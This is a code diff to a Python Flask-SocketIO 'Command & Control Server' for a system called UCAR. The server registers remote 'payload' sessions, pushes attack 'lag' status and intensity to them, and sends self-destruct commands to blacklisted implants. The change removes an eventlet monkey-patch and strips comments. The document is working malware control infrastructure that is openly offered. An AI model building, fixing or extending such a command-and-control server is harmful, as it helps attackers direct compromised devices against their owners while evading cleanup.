@@ -1,9 +1,9 @@
 # UCAR System: Command & Control Server
 # Author: Sigma
 
-# --- CRITICAL FIX: Monkey Patching ---
-import eventlet
-eventlet.monkey_patch()
+# --- FIX: Removed explicit monkey_patch ---
+# Gunicorn with '-k eventlet' handles patching automatically.
+# Patching here breaks the Gunicorn Master process (Arbiter).
 
 from flask import Flask
 from flask_socketio import SocketIO, emit, join_room
@@ -11,11 +11,11 @@ import time
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
+# async_mode='eventlet' is sufficient here
 socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")
 
 # --- Data Store ---
 sessions = {}
-# Blacklist to prevent deleted payloads from reappearing
 blacklist = set()
 
 @app.route('/')
@@ -55,17 +55,9 @@ def handle_lag(data):
 
 @socketio.on('delete_session', namespace='/dashboard')
 def delete_session(data):
-    """Hard delete: Triggers self-destruct and blacklists the ID."""
     sid = data.get('session_id')
-    
-    # 1. Add to blacklist immediately
     blacklist.add(sid)
-    
-    # 2. Send Self-Destruct Command
-    print(f"Issuing KILL command to {sid}")
     socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
-    
-    # 3. Remove from active sessions
     if sid in sessions:
         del sessions[sid]
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
@@ -84,9 +76,7 @@ def payload_register(data):
     sid = data.get('session_id')
     if not sid: return
     
-    # Check Blacklist
     if sid in blacklist:
-        # If a blacklisted payload tries to connect, kill it again.
         join_room(sid)
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
         return
@@ -107,12 +97,11 @@ def payload_register(data):
         
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
     
-    # Sync attack state (in case of reconnect)
+    # Sync attack state
     emit('command_update_lag', {
         'status': sessions[sid]['lag_status'], 
         'intensity': sessions[sid]['lag_intensity']
     }, namespace='/payload', room=sid)
-
 
 @socketio.on('payload_heartbeat', namespace='/payload')
 def heartbeat(data):
@@ -120,7 +109,6 @@ def heartbeat(data):
     if sid in sessions:
         sessions[sid]['last_seen'] = time.time()
     elif sid in blacklist:
-        # Kill heartbeat from blacklisted device
         emit('command_self_destruct', {}, namespace='/payload', room=sid)
 
 if __name__ == '__main__':
